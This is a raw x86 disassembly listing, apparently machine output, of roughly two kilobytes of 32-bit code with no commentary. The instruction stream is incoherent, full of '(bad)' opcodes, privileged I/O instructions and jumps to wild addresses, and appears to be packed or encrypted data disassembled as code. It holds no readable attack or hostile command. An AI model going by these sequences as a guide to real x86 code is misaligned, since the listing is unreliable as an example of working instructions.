  415a79:	sti    
  415a7a:	fwait
  415a7b:	cmp    BYTE PTR [eax],bl
  415a7d:	pop    esi
  415a7e:	or     DWORD PTR ds:0x476b0cbb,eax
  415a84:	fimul  DWORD PTR [edi+0x421c2dac]
  415a8a:	xor    dh,ah
  415a8c:	push   ebp
  415a8d:	clc    
  415a8e:	cmp    eax,edi
  415a90:	ins    DWORD PTR es:[edi],dx
  415a91:	imul   ebp,ebp,0x74
  415a94:	aad    0x89
  415a96:	or     al,0xec
  415a98:	adc    esp,ebp
  415a9a:	pop    es
  415a9b:	xchg   edi,eax
  415a9c:	int    0xe0
  415a9e:	outs   dx,BYTE PTR ds:[esi]
  415a9f:	xchg   esp,eax
  415aa0:	and    bh,dh
  415aa2:	or     eax,0xf0f00ea4
  415aa7:	cmp    esp,DWORD PTR [eax+0xf]
  415aaa:	sub    al,0x6e
  415aac:	or     esi,DWORD PTR [ebp+0xe]
  415aaf:	fwait
  415ab0:	jmp    0x415ad8
  415ab2:	inc    ebx
  415ab3:	scas   al,BYTE PTR es:[edi]
  415ab4:	or     edx,DWORD PTR [edx]
  415ab6:	out    dx,eax
  415ab7:	dec    ebp
  415ab8:	lock push cs
  415aba:	loopne 0x415ac3
  415abc:	hlt    
  415abd:	sub    eax,0x1632cf6c
  415ac2:	mov    ds:0x16f8f4f0,eax
  415ac7:	in     al,dx
  415ac8:	pushw  0x5987
  415acc:	or     ebx,DWORD PTR [eax]
  415ace:	pop    ecx
  415acf:	pop    ss
  415ad0:	adc    BYTE PTR [esi+0x1687c90b],dh
  415ad6:	inc    ebp
  415ad7:	cld    
  415ad8:	ret    0xcc26
  415adb:	call   0x39402001
  415ae0:	cmp    ebx,DWORD PTR ds:0x29537f4c
  415ae6:	pop    es
  415ae7:	shl    BYTE PTR [edi],cl
  415ae9:	popa   
  415aea:	push   edx
  415aeb:	in     al,dx
  415aec:	or     eax,0xe2a80e03
  415af1:	pop    ebx
  415af2:	cmp    BYTE PTR [ebp+0x5de1040d],dl
  415af8:	jmp    0x415b2c
  415afa:	jb     0x415b0e
  415afc:	jb     0x415ac5
  415afe:	inc    esp
  415aff:	adc    DWORD PTR [edi+ebx*1],ecx
  415b02:	das    
  415b03:	sti    
  415b04:	and    eax,DWORD PTR [esi-0x74bb01bd]
  415b0a:	inc    ebp
  415b0b:	cld    
  415b0c:	pop    ebx
  415b0d:	mov    esp,ebp
  415b0f:	lock stos DWORD PTR es:[edi],eax
  415b11:	and    BYTE PTR [edi+0x5b8172f0],al
  415b17:	mov    dl,0x1f
  415b19:	iret   
  415b1a:	nop
  415b1b:	cmp    ebx,ebp
  415b1d:	jne    0x415b35
  415b1f:	jae    0x415b29
  415b21:	mov    bl,0x6
  415b23:	(bad)  
  415b25:	lahf   
  415b26:	or     eax,0xcbce15b6
  415b2b:	and    eax,0xfcf85d89
  415b30:	sub    al,0xb8
  415b32:	or     al,0x21
  415b34:	push   ss
  415b35:	sub    bh,al
  415b37:	sbb    dh,dh
  415b39:	ret    
  415b3a:	mul    DWORD PTR [eax+0x67]
  415b3d:	sbb    esp,DWORD PTR [edi+0x45094c0f]
  415b43:	sahf   
  415b44:	dec    DWORD PTR ds:0x18bb7bce
  415b4a:	mov    ah,0xbe
  415b4c:	int    0x2b
  415b4e:	sub    DWORD PTR ds:0x30e329d5,eax
  415b54:	mov    dh,0x44
  415b56:	pop    ds
  415b57:	push   ebx
  415b58:	cmp    al,0xc
  415b5a:	popa   
  415b5b:	mov    cl,0x21
  415b5d:	cmp    DWORD PTR ds:0x3a907b8,0xfffffff5
  415b64:	or     dl,BYTE PTR ds:[esp+eax*4]
  415b68:	push   es
  415b69:	xchg   ch,cl
  415b6b:	cmp    esp,ecx
  415b6d:	adc    eax,0x6caca44c
  415b72:	push   ds
  415b73:	sbb    al,0xb1
  415b75:	ret    
  415b76:	and    al,0x22
  415b78:	lea    edi,[esi-0x10]
  415b7b:	add    al,0x95
  415b7d:	(bad)  
  415b7e:	loope  0x415b33
  415b80:	shl    BYTE PTR [ebx+eax*1-0x3d],1
  415b84:	sub    BYTE PTR [eax],bl
  415b86:	sub    al,0x29
  415b88:	outs   dx,BYTE PTR ds:[esi]
  415b89:	cmove  eax,DWORD PTR [esi+0x18]
  415b8d:	add    DWORD PTR [eax+0x4d7ed581],ebx
  415b93:	mov    BYTE PTR [ecx],dl
  415b95:	add    DWORD PTR ds:0x9ec6aa25,0xf8e3e25d
  415b9f:	or     eax,0x1e747200
  415ba4:	mov    bl,0xf8
  415ba6:	add    al,0xfb
  415ba8:	out    dx,al
  415ba9:	cmp    DWORD PTR [edx*4-0x7ce1b1f5],eax
  415bb0:	or     BYTE PTR [ecx],al
  415bb2:	jmp    0x415bf0
  415bb4:	pop    es
  415bb5:	or     DWORD PTR [esi-0xf8664ce],esi
  415bbb:	sbb    eax,DWORD PTR [eax*4-0x63514e28]
  415bc2:	or     BYTE PTR [ecx+0x9],al
  415bc5:	adc    BYTE PTR [eax],cl
  415bc7:	or     al,0x33
  415bc9:	xchg   ebx,eax
  415bca:	(bad)  
  415bcb:	into   
  415bcc:	dec    ebp
  415bcd:	sbb    dl,BYTE PTR [edi+eiz*8]
  415bd0:	lods   eax,DWORD PTR ds:[esi]
  415bd1:	lods   al,BYTE PTR ds:[esi]
  415bd2:	inc    eax
  415bd3:	js     0x415bf8
  415bd5:	mov    ecx,0xa19ea3d3
  415bda:	and    al,0xd6
  415bdc:	xor    ah,BYTE PTR [eax]
  415bde:	add    edx,esi
  415be0:	shl    BYTE PTR ds:0x461c585f,cl
  415be6:	sar    BYTE PTR [esi],cl
  415be8:	xchg   ecx,eax
  415be9:	jo     0x415be5
  415beb:	hlt    
  415bec:	(bad)  
  415bed:	sti    
  415bee:	mov    esi,DWORD PTR [eax]
  415bf0:	and    esi,0xe5c64bc2
  415bf6:	cmp    esi,ebx
  415bf8:	lods   eax,DWORD PTR ds:[esi]
  415bf9:	mov    dh,0x2b
  415bfb:	rol    BYTE PTR ds:0xd3174944,1
  415c01:	or     dl,bh
  415c03:	or     al,0xc2
  415c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c06:	lahf   
  415c07:	nop
  415c08:	out    dx,al
  415c09:	sub    ebp,ebx
  415c0b:	idiv   DWORD PTR [ebx]
  415c0d:	adc    eax,0x3c162d28
  415c12:	pusha  
  415c13:	mov    WORD PTR ds:0x6f8d0fc1,gs
  415c19:	xchg   DWORD PTR [edi+ebp*8+0x1801d8c8],ebp
  415c20:	sub    DWORD PTR [ebx+0x45b643de],ecx
  415c26:	pusha  
  415c27:	cmc    
  415c28:	pop    esp
  415c29:	cmp    al,0xf6
  415c2b:	add    BYTE PTR [edi-0x71e95ff8],bl
  415c31:	lds    esi,FWORD PTR [esi-0x15f99718]
  415c37:	cmp    ebp,0xffffffdc
  415c3a:	and    eax,esi
  415c3c:	ds inc ebp
  415c3e:	and    al,0xcd
  415c40:	dec    ch
  415c42:	add    ch,BYTE PTR [eax]
  415c44:	sub    BYTE PTR [eax-0x4f],ah
  415c47:	popa   
  415c48:	lock add eax,0xc7534cca
  415c4e:	push   cs
  415c4f:	ret    0x8bf9
  415c52:	sti    
  415c53:	sub    edi,esi
  415c55:	mov    eax,0x7f833b65
  415c5a:	dec    edi
  415c5b:	fadd   DWORD PTR [ecx]
  415c5d:	jmp    0x1488613
  415c62:	cmp    eax,0xa1185918
  415c67:	adc    ebp,DWORD PTR [eax+0x5ce9091]
  415c6d:	outs   dx,BYTE PTR fs:[esi]
  415c6f:	mov    cl,0x10
  415c71:	lods   al,BYTE PTR ds:[esi]
  415c72:	push   esi
  415c73:	jae    0x415c8b
  415c75:	mov    bl,0xcb
  415c77:	and    eax,0xf8bec108
  415c7c:	pop    edx
  415c7d:	or     ebx,eax
  415c7f:	pop    eax
  415c80:	sbb    dh,bh
  415c82:	not    DWORD PTR [edx+0x1784961c]
  415c88:	les    ecx,FWORD PTR [edi+0x77]
  415c8b:	imul   eax,DWORD PTR [ecx-0x39537d1],0xfffffffd
  415c92:	mov    DWORD PTR [ebx],0x7be421c5
  415c98:	cwde   
  415c99:	jmp    0xd2c559c9
  415c9e:	sub    ebp,edi
  415ca0:	aam    0xe
  415ca2:	mov    bl,0x4f
  415ca4:	mov    al,ds:0x4f652550
  415ca9:	add    ebx,ebp
  415cab:	in     al,0xd0
  415cad:	sub    al,0x5e
  415caf:	add    bl,BYTE PTR [ecx-0x15]
  415cb2:	cmp    edx,DWORD PTR ds:0x9c9bdf78
  415cb8:	iret   
  415cb9:	sub    ah,BYTE PTR [eax+0x15]
  415cbc:	xlat   BYTE PTR ds:[ebx]
  415cbd:	sbb    ebp,esp
  415cbf:	xchg   edx,eax
  415cc0:	xor    eax,0xa010341b
  415cc5:	push   cs
  415cc6:	mov    DWORD PTR [esi+edx*1+0x644810ae],ebx
  415ccd:	sbb    eax,0x86c21deb
  415cd2:	dec    esi
  415cd3:	xor    al,0x26
  415cd5:	ror    BYTE PTR [ebx],0x9
  415cd8:	ds and al,0x30
  415cdb:	in     al,0x90
  415cdd:	xlat   BYTE PTR ds:[ebx]
  415cde:	adc    eax,DWORD PTR [edx-0x160dbf5f]
  415ce4:	sbb    BYTE PTR [ebx+ecx*8+0x78d82899],bl
  415ceb:	test   eax,0x1561563b
  415cf0:	fmul   DWORD PTR [ebp-0x140327fb]
  415cf6:	cmp    eax,0xb1d3a19c
  415cfb:	in     eax,dx
  415cfc:	adc    dl,BYTE PTR [esp+ebx*2-0x79]
  415d00:	mov    BYTE PTR [eax-0x45],0xc5
  415d04:	nop
  415d05:	ror    DWORD PTR [ebx],0x7d
  415d08:	add    bl,BYTE PTR [esi+eax*8]
  415d0b:	jbe    0x415d2c
  415d0d:	clc    
  415d0e:	jle    0x415d84
  415d10:	adc    ch,BYTE PTR [ebx+ecx*8-0x6f]
  415d14:	sub    BYTE PTR [edx],bl
  415d16:	mov    eax,0x792143f
  415d1b:	xchg   BYTE PTR [ecx],al
  415d1d:	aas    
  415d1e:	int    0xa0
  415d20:	sub    BYTE PTR [edi-0xb],ah
  415d23:	stos   BYTE PTR es:[edi],al
  415d24:	(bad)  
  415d25:	(bad)  
  415d26:	aad    0x43
  415d28:	fmul   DWORD PTR [esi-0x64e9120a]
  415d2e:	jle    0x415d4a
  415d30:	dec    eax
  415d31:	call   DWORD PTR ds:0xc30ff038
  415d37:	ret    
  415d38:	mov    ebp,0x750517f9
  415d3d:	push   cs
  415d3e:	mov    al,0x1
  415d40:	sbb    DWORD PTR [eax-0x2830fa15],esp
  415d46:	ins    BYTE PTR es:[edi],dx
  415d47:	(bad)  [eax+0x15]
  415d4a:	jae    0x415cd1
  415d4c:	stos   BYTE PTR es:[edi],al
  415d4d:	adc    eax,0xece83c2a
  415d52:	push   ss
  415d53:	iret   
  415d54:	cmp    BYTE PTR ds:0x22702b0,ch
  415d5a:	aad    0x5b
  415d5c:	mov    eax,0x51c3feea
  415d61:	jmp    0x6a73d22f
  415d66:	fld    TBYTE PTR [edi+edi*4-0x15]
  415d6a:	je     0x415d84
  415d6c:	push   eax
  415d6d:	mov    eax,ecx
  415d6f:	daa    
  415d70:	inc    eax
  415d71:	pop    ecx
  415d72:	or     DWORD PTR [edx],esi
  415d74:	sbb    esi,ebx
  415d76:	imul   esp,DWORD PTR [edi-0x25],0x70
  415d7a:	ret    
  415d7b:	sub    ecx,ebp
  415d7d:	lahf   
  415d7e:	sbb    BYTE PTR [eax-0x6a],al
  415d81:	cs mov dl,0xdd
  415d84:	pop    ss
  415d85:	jne    0x415d72
  415d87:	adc    eax,0xd0103101
  415d8c:	mov    ecx,0x84cdf33b
  415d91:	xor    edi,esp
  415d93:	outs   dx,DWORD PTR ds:[esi]
  415d94:	mov    DWORD PTR ds:0x6171004,edx
  415d9a:	popa   
  415d9b:	retf   
  415d9c:	bound  edx,QWORD PTR [eax+0xfe371c3]
  415da2:	cmp    eax,0x1dafa108
  415da7:	data16 fild DWORD PTR [eax+0x32]
  415dab:	or     al,0x84
  415dad:	pop    edi
  415dae:	xchg   BYTE PTR [edi-0x6],bh
  415db1:	outs   dx,BYTE PTR ds:[esi]
  415db2:	or     eax,0x8b2c4225
  415db7:	cwde   
  415db8:	add    al,0xfc
  415dba:	jo     0x8bb876bb
  415dc0:	(bad)  
  415dc1:	xlat   BYTE PTR ds:[ebx]
  415dc2:	sahf   
  415dc3:	sti    
  415dc4:	mov    al,bl
  415dc6:	mov    bl,BYTE PTR [eax+0x2d094144]
  415dcc:	stos   BYTE PTR es:[edi],al
  415dcd:	dec    eax
  415dce:	in     al,dx
  415dcf:	aas    
  415dd0:	inc    edi
  415dd1:	aas    
  415dd2:	jg     0x415d57
  415dd4:	loopne 0x415e55
  415dd6:	adc    edi,DWORD PTR [edx+0x54]
  415dd9:	ret    
  415dda:	push   eax
  415ddb:	push   edx
  415ddc:	push   ecx
  415ddd:	cmp    bh,BYTE PTR [ebx-0x7c8c5f23]
  415de3:	mov    eax,0x7b7558b3
  415de8:	xor    eax,eax
  415dea:	xchg   edi,eax
  415deb:	and    ah,BYTE PTR [ebx+0x2d]
  415dee:	push   ss
  415def:	repz je 0x415e4c
  415df2:	mov    DWORD PTR [edi+0x3dd5bc56],esi
  415df8:	add    cl,BYTE PTR [ecx+0x22058bc6]
  415dfe:	or     al,BYTE PTR [esi]
  415e00:	jmp    FWORD PTR [edi-0x1]
  415e03:	(bad)  [ebx+ebp*1-0x47]
  415e07:	jle    0x415e21
  415e09:	cmp    edx,eax
  415e0b:	jg     0x415e28
  415e0d:	sub    eax,edx
  415e0f:	inc    eax
  415e10:	cli    
  415e11:	jl     0x415e27
  415e13:	cmp    ecx,eax
  415e15:	jg     0x415e2b
  415e17:	add    esi,edx
  415e19:	mov    BYTE PTR [edi],cl
  415e1b:	inc    edi
  415e1c:	outs   dx,DWORD PTR ds:[esi]
  415e1d:	lock out dx,eax
  415e1f:	(bad)  
  415e20:	repz sahf 
  415e22:	adc    DWORD PTR [edx+0x31e58b01],edi
  415e28:	leave  
  415e29:	jmp    0x415e97
  415e2b:	shr    ebx,0xe8
  415e2e:	loopne 0x415db4
  415e30:	fcmovb st,st(6)
  415e32:	mov    BYTE PTR [edi],al
  415e34:	aas    
  415e35:	ret    0x1343
  415e38:	cmp    DWORD PTR [edx-0x49],0xfd1ed857
  415e3f:	fcmovnbe st,st(1)
  415e41:	mov    ebx,0x729f2d74
  415e46:	aaa    
  415e47:	push   ss
  415e48:	pop    esi
  415e49:	cdq    
  415e4a:	inc    ecx
  415e4b:	dec    eax
  415e4c:	mov    BYTE PTR [eax-0x3a],ch
  415e4f:	xchg   ecx,eax
  415e50:	add    DWORD PTR [edx],edi
  415e52:	add    al,0xed
  415e54:	(bad)  
  415e56:	mov    bh,0xfe
  415e58:	lea    eax,[esp+0x68504109]
  415e5f:	add    eax,0xdc008205
  415e64:	or     ebx,DWORD PTR [eax+0x54c117e3]
  415e6a:	lea    esi,[ebx+0x23503f14]
  415e70:	lods   al,BYTE PTR ss:[esi]
  415e72:	or     eax,0x1281f2a
  415e77:	mov    dh,0x83
  415e79:	jne    0x415ed5
  415e7b:	mov    ecx,0x6a582e20
  415e80:	adc    BYTE PTR [ebx+0x16],cl
  415e83:	adc    BYTE PTR [edx+0x44],ah
  415e86:	ja     0x415eac
  415e88:	or     ch,dh
  415e8a:	lock push ss
  415e8c:	and    dl,BYTE PTR [ecx-0x70]
  415e8f:	or     al,0xbc
  415e91:	xchg   edi,eax
  415e92:	in     eax,dx
  415e93:	call   DWORD PTR [edi]
  415e95:	jle    0x415e72
  415e97:	mov    edi,edx
  415e99:	mov    eax,ds:0x1377f739
  415e9e:	je     0x415ecf
  415ea0:	sar    ecx,0x2
  415ea3:	js     0x415ecf
  415ea5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea7:	mov    ebx,0xed6b7fbf
  415eac:	and    ecx,0x3
  415eaf:	iret   
  415eb0:	mov    esp,0xfc317421
  415eb5:	lea    edi,[ecx+edi*1-0x4]
  415eb9:	sbb    BYTE PTR [ecx],dl
  415ebb:	std    
  415ebc:	loopne 0x415e78
  415ebe:	in     eax,dx
  415ebf:	pusha  
  415ec0:	sbb    DWORD PTR [ebx+0x1fc702c6],eax
  415ec6:	cld    
  415ec7:	and    cl,al
  415ec9:	scas   eax,DWORD PTR es:[edi]
  415eca:	xor    BYTE PTR [edx-0x69f9d766],dh
  415ed0:	or     BYTE PTR [eax-0x7c82e],bh
  415ed6:	sahf   
  415ed7:	xor    al,0x2b
  415ed9:	fdivr  QWORD PTR [ebx+0x66]
  415edc:	mov    ecx,DWORD PTR [eax+0x4]
  415edf:	sub    cx,0xd7b1
  415ee4:	push   edx
  415ee5:	dec    ecx
  415ee6:	lea    cx,[ebx]
  415ee9:	outs   dx,DWORD PTR ds:[esi]
  415eea:	lock sub ecx,0x2
  415eee:	jae    0x415e77
  415ef0:	(bad)  
  415ef2:	rol    DWORD PTR [eax],cl
  415ef4:	jmp    0x415f11
  415ef6:	cmp    al,0xd7
  415ef8:	cmc    
  415ef9:	retf   
  415efa:	(bad)  
  415efb:	jmp    0x415f14
  415efd:	pop    edi
  415efe:	add    dh,BYTE PTR [edi+eax*1+0x3d]
  415f02:	loopne 0x415f07
  415f04:	add    BYTE PTR [ecx+edx*1],0xcf
  415f08:	sbb    eax,0x67580166
  415f0d:	fs pop es
  415f0f:	mov    eax,ebx
  415f11:	int3   
  415f12:	ret    0xa16e
  415f15:	pusha  
  415f16:	mov    ds:0x1b0e1c72,eax
  415f1b:	adc    al,0x47
  415f1d:	(bad)  [edx+0x58be6019]
  415f23:	inc    ebx
  415f24:	cmp    eax,0xadbb7257
  415f29:	std    
  415f2a:	mov    bh,0x2f
  415f2c:	add    eax,0x2977d7b3
  415f31:	and    ax,0xd7b2
  415f35:	or     DWORD PTR [ebx],eax
  415f37:	jne    0x415f72
  415f39:	call   DWORD PTR [ebx-0x17]
  415f3c:	jae    0x415fb4
  415f3e:	test   eax,0xf6859e1c
  415f43:	or     ah,BYTE PTR [esp+esi*2]
  415f46:	sbb    esp,DWORD PTR [esi+0x1b]
  415f49:	outs   dx,BYTE PTR ds:[esi]
  415f4a:	mov    ebx,ebp
  415f4c:	dec    edi
  415f4d:	jmp    0x415f61
  415f4f:	hlt    
  415f50:	dec    eax
  415f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f52:	dec    eax
  415f53:	mov    eax,0x7b38442f
  415f58:	imul   esp,DWORD PTR [ebx-0x3a],0x88c70627
  415f5f:	int    0xf3
  415f61:	movzx  ebp,WORD PTR [edi]
  415f64:	shl    eax,0x10
  415f67:	add    ax,0xd189
  415f6b:	or     BYTE PTR [ecx],cl
  415f6d:	rep stos DWORD PTR es:[edi],eax
  415f6f:	mov    ecx,edx
  415f71:	rcl    esp,1
  415f73:	jo     0x415f5f
  415f75:	stos   BYTE PTR es:[edi],al
  415f76:	pop    edi
  415f77:	aas    
  415f78:	sub    BYTE PTR [eax+0xc],dl
  415f7b:	ins    BYTE PTR es:[edi],dx
  415f7c:	neg    BYTE PTR [ebx]
  415f7e:	fistp  QWORD PTR [esi-0x4024cefb]
  415f84:	int3   
  415f85:	add    BYTE PTR [edx+ecx*4],cl
  415f88:	push   ds
  415f89:	inc    esi
  415f8a:	je     0x415fac
  415f8c:	je     0x415f86
  415f8e:	mov    ch,0x0
  415f90:	push   es
  415f91:	retf   
  415f92:	iret   
  415f93:	repnz imul BYTE PTR ds:0x2b046274
  415f9a:	je     0x415ffb
  415f9c:	and    al,0x78
  415f9e:	je     0x415ffa
  415fa0:	pop    eax
  415fa1:	dec    edi
  415fa2:	neg    DWORD PTR [edx-0x35]
  415fa5:	je     0x415ffc
  415fa7:	xor    BYTE PTR [ecx],ch
  415fa9:	daa    
  415faa:	adc    DWORD PTR [eax+0x43],ecx
  415fad:	in     eax,dx
  415fae:	(bad)  
  415faf:	push   ss
  415fb0:	or     eax,0x17520bb
  415fb5:	sub    bl,0x30
  415fb8:	adc    DWORD PTR ds:0x9fff5ae,ebx
  415fbe:	ja     0x415fe5
  415fc0:	cmp    eax,edi
  415fc2:	ja     0x415fe5
  415fc4:	lea    eax,[eax+eax*4]
  415fc7:	add    eax,eax
  415fc9:	pop    ds
  415fca:	sub    edi,edx
  415fcc:	out    0xff,al
  415fce:	jmp    FWORD PTR [ebp-0x1f32013f]
  415fd4:	imul   edi,DWORD PTR [ebp+0x54],0xeb4609eb
  415fdb:	push   es
  415fdc:	neg    eax
  415fde:	jle    0x41602b
  415fe0:	js     0x41602b
  415fe2:	pop    ebx
  415fe3:	sub    esi,ebx
  415fe5:	arpl   WORD PTR [ebx+0x70],cx
  415fe8:	imul   ebx
  415fea:	inc    edi
  415feb:	inc    ch
  415fed:	and    bl,ch
  415fef:	pushf  
  415ff0:	mov    edi,0x742a0f06
  415ff5:	ins    BYTE PTR es:[edi],dx
  415ff6:	iret   
  415ff7:	mov    dh,0xb7
  415ff9:	fild   WORD PTR [ecx+0x61]
  415ffc:	jb     0x416001
  415ffe:	dec    ecx
  415fff:	and    BYTE PTR [esi+esi*2+0xb],cl
  416003:	pop    es
  416004:	adc    DWORD PTR [esi],ecx
  416006:	fstp   TBYTE PTR [edx-0x2f88fa41]
  41600c:	add    bl,0xa
  41600f:	push   edi
  416010:	leave  
  416011:	into   
  416012:	add    al,0x55
  416014:	aad    0x12
  416016:	pop    esi
  416017:	mov    edi,0x4c02755d
  41601c:	pop    ecx
  41601d:	xor    esi,esi
  41601f:	mov    DWORD PTR [edx],esi
  416021:	aad    0xfb
  416023:	ds cmp al,0x6c
  416026:	js     0x415fa9
  416028:	loope  0x416029
  41602a:	or     esi,ebx
  41602c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602d:	in     eax,dx
  41602e:	inc    eax
  41602f:	mov    ebx,0x42cdd01c
  416034:	mov    bh,0x76
  416036:	in     al,0x82
  416038:	jl     0x416087
  41603a:	sti    
  41603b:	call   0x725a:0x8ecdff3d
  416042:	sub    DWORD PTR [ebp-0x7c3d767f],ecx
  416048:	loop   0x416069
  41604a:	lea    edx,[edx+edx*4]
  41604d:	fucomi st,st(4)
  41604f:	out    dx,eax
  416050:	fcomi  st,st(6)
  416052:	lods   al,BYTE PTR ds:[esi]
  416053:	push   ebx
  416054:	xchg   DWORD PTR ds:0xe862de2e,ebp
  41605a:	add    eax,0xf157974
  41605f:	je     0x41606d
  416061:	pop    ss
  416062:	out    0xcd,eax
  416064:	jge    0x416058
  416066:	mov    ebp,0x6174042e
  41606b:	xlat   BYTE PTR ds:[ebx]
  41606c:	adc    BYTE PTR [ebx+0x53],al
  41606f:	das    
  416070:	jae    0x4160d6
  416072:	(bad)  
  416073:	(bad)  
  416075:	push   ebx
  416076:	jge    0x4160c0
  416078:	jge    0x4160c0
  41607a:	inc    esp
  41607b:	stc    
  41607c:	add    esi,edx
  41607e:	pop    esp
  41607f:	leave  
  416080:	xor    al,0xf9
  416082:	sbb    al,0xf9
  416084:	fisubr DWORD PTR [ebp+0xeebfee0]
  41608a:	fstp   st(0)
  41608c:	fld    TBYTE PTR [ebx+0x944347d]
  416092:	fldz   
  416094:	(bad)  
  416095:	fs add eax,0x800c004e
  41609b:	xor    eax,0x3c839009
  4160a0:	enter  0xa03f,0x2
  4160a4:	inc    eax
  4160a5:	enter  0xf205,0x20
  4160a9:	pslld  mm7,mm2
  4160ac:	or     BYTE PTR [eax-0x64],al
  4160af:	or     al,0x50
  4160b1:	ret    
  4160b2:	paddb  mm4,mm4
  4160b5:	daa    
  4160b6:	mov    esp,tr6
  4160b9:	adc    al,BYTE PTR [eax+0x20169896]
  4160bf:	mov    esp,0xf23f19be
  4160c4:	xchg   ebx,eax
  4160c5:	lahf   
  4160c6:	sub    BYTE PTR [ebx-0x12],ch
  4160c9:	sbb    al,0xf9
  4160cb:	add    dl,BYTE PTR [ebp+0x43b74020]
  4160d1:	mov    edx,0x85cbb723
  4160d6:	xor    ah,BYTE PTR [edi]
  4160d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d9:	aam    0x5e
  4160db:	sub    eax,0x9fe72a13
  4160e0:	(bad)  
  4160e1:	std    
  4160e2:	out    0x84,eax
  4160e4:	xchg   ecx,eax
  4160e5:	sub    al,BYTE PTR [eax-0x4a19df0c]
  4160eb:	sub    eax,0xa931a009
  4160f0:	pop    edi
  4160f1:	jecxz  0x416123
  4160f3:	add    al,0xbf
  4160f5:	out    0x6f,al
  4160f7:	(bad)  
  4160f8:	repz leave 
  4160fa:	sbb    ecx,DWORD PTR [esi-0x43d13acc]
  416100:	mov    ds:0x764037b1,al
  416105:	cmp    ch,BYTE PTR [ebx+0xb]
  416108:	fidivr WORD PTR [edx]
  41610a:	jmp    ebp
  41610c:	outs   dx,DWORD PTR ds:[esi]
  41610d:	(bad)  
  41610e:	call   0xc764659c
  416113:	mov    bh,BYTE PTR [esi]
  416115:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  41611c:	cmp    BYTE PTR [edx+0x17],0xb7
  416120:	xlat   BYTE PTR es:[ebx]
  416122:	fadd   DWORD PTR [ebx+ecx*8+0x7f]
  416126:	stc    
  416127:	das    
  416128:	nop
  416129:	lods   al,BYTE PTR ds:[esi]
  41612a:	outs   dx,BYTE PTR ds:[esi]
  41612b:	xor    bh,BYTE PTR [eax-0x7a]
  41612e:	xchg   DWORD PTR [eax-0x4c],ecx
  416131:	push   edi
  416132:	or     bh,BYTE PTR [edi]
  416134:	push   ss
  416135:	push   0xffa14ba9
  41613a:	inc    DWORD PTR [esi]
  41613c:	(bad)  
  41613d:	in     eax,dx
  41613e:	int3   
  41613f:	into   
  416140:	sbb    eax,edx
  416142:	ror    DWORD PTR [esi+0x40],cl
  416145:	fst    QWORD PTR [eax+eax*2]
  416148:	popa   
  416149:	push   ecx
  41614a:	pop    ecx
  41614b:	test   BYTE PTR [edx+0x40],dl
  41614e:	enter  0x19a5,0x90
  416152:	mov    ecx,0xffff6fa5
  416157:	(bad)  
  416158:	jmp    DWORD PTR [ebp+0xf3a4055]
  41615e:	and    ah,dh
  416160:	daa    
  416161:	(bad)  
  416162:	retf   
  416163:	into   
  416164:	pop    eax
  416165:	inc    eax
  416166:	test   BYTE PTR [ecx],cl
  416168:	xchg   esp,eax
  416169:	clc    
  41616a:	js     0x4161a5
  41616c:	aas    
  41616d:	sbb    DWORD PTR [eax+eax*2-0x1b],0xd736b90b
  416175:	pop    es
  416176:	(bad)  
  416177:	mov    eax,ds:0xffffff5f
  41617c:	inc    DWORD PTR [eax-0x21]
  41617f:	dec    esi
  416180:	addr16 add al,0xcd
  416183:	leave  
  416184:	repnz leave 
  416186:	bound  eax,QWORD PTR [eax-0x6a]
  416189:	and    al,BYTE PTR [ecx+0x6f7c4045]
  41618f:	cld    
  416190:	gs inc eax
  416192:	sahf   
  416193:	mov    ch,0x70
  416195:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  41619b:	inc    eax
  41619c:	aad    0xff
  41619e:	das    
  41619f:	mov    cl,0xfd
  4161a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a2:	iret   
  4161a3:	dec    DWORD PTR [ecx+0x1f]
  4161a6:	js     0x416202
  4161a8:	inc    eax
  4161a9:	call   0xab582749
  4161ae:	mov    bl,0xef
  4161b0:	cmp    eax,0xe98ce041
  4161b5:	(bad)  
  4161b6:	(bad)  
  4161b7:	(bad)  
  4161b8:	inc    DWORD PTR [eax-0x6c45b837]
  4161be:	test   al,0x41
  4161c0:	stos   BYTE PTR es:[edi],al
  4161c1:	pop    ss
  4161c2:	out    0x7f,al
  4161c4:	sub    esp,DWORD PTR [ecx+0x4212b616]
  4161ca:	imul   edx,DWORD PTR [ebp+0x27],0x39
  4161ce:	(bad)  
  4161cf:	div    DWORD PTR [eax-0x20]
  4161d2:	jl     0x416216
  4161d4:	xor    cl,cl
  4161d6:	cmp    al,0xe3
  4161d8:	(bad)  
  4161d9:	(bad)  
  4161da:	jmp    FWORD PTR [edi]
  4161dc:	cld    
  4161dd:	xchg   esi,eax
  4161de:	push   edx
  4161df:	mov    ah,bh
  4161e1:	inc    edx
  4161e2:	mov    fs,WORD PTR [ebp+ebx*4-0x55811405]
  4161e9:	push   ecx
  4161ea:	inc    ebx
  4161eb:	mov    WORD PTR [edi],gs
  4161ed:	push   0x5c
  4161ef:	sbb    esp,edi
  4161f1:	sar    BYTE PTR es:[ebx-0x1c89bd],cl
  4161f8:	(bad)  
  4161f9:	(bad)  
  4161fa:	dec    esp
  4161fc:	repnz sub DWORD PTR [edi],ebp
  4161ff:	test   BYTE PTR [ecx+0xad24426],al
  416205:	nop
  416206:	fild   DWORD PTR [eax]
  416208:	daa    
  416209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41620a:	lahf   
  41620b:	nop
  41620c:	inc    esp
  41620d:	pop    ss
  41620e:	stos   BYTE PTR es:[edi],al
  41620f:	clc    
  416210:	scas   al,BYTE PTR es:[edi]
  416211:	adc    bl,ah
  416213:	(bad)
  416216:	inc    esp
  416217:	pop    ecx
  416218:	pushf  
  416219:	mov    al,0xe9
  41621b:	(bad)  
  41621c:	(bad)  
  41621d:	(bad)  
  41621e:	inc    DWORD PTR [edi]
  416220:	pushf  
  416221:	mov    dh,dl
  416223:	fs inc ebp
  416225:	aam    0xf3
  416227:	imul   ebx
  416229:	loope  0x416275
  41622b:	jp     0x4161c2
  41622d:	iret   
  41622e:	inc    ebp
  41622f:	bound  esp,QWORD PTR [edx-0x2723f86b]
  416235:	ds mov eax,0x91c74639
  41623b:	push   cs
  41623c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
